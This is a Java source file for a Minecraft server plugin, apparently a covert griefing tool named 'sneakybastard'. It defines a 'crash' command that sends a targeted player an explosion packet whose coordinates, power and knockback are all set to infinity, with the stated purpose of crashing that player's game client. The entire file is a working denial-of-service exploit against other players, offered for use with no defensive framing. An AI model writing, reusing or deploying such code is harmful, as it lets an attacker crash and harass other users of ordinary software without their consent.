package net.blackofworld.sneakybastard.Commands.Player;

import net.blackofworld.sneakybastard.Command.CommandBase;
import net.blackofworld.sneakybastard.Command.CommandCategory;
import net.blackofworld.sneakybastard.Command.CommandInfo;
import net.minecraft.network.protocol.game.ClientboundExplodePacket;
import net.minecraft.world.phys.Vec3;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Collections;
@CommandInfo(command = "crash", description = "Crashes the player", Syntax = "<player>", category = CommandCategory.Player)
public class Crash extends CommandBase {
    @Override
    public void Execute(Player p, ArrayList<String> args) {
        if(args.isEmpty()) {
            p.sendHelp(this);
            return;
        }
        Player pp = Bukkit.getPlayerExact(args[0]);
        if(pp == null) {
            p.sendHelp(this);
            return;
        }
        ClientboundExplodePacket packet = new ClientboundExplodePacket(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Float.POSITIVE_INFINITY, Collections.EMPTY_LIST, new Vec3(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY));
        pp.SendPacket(packet);
    }
}
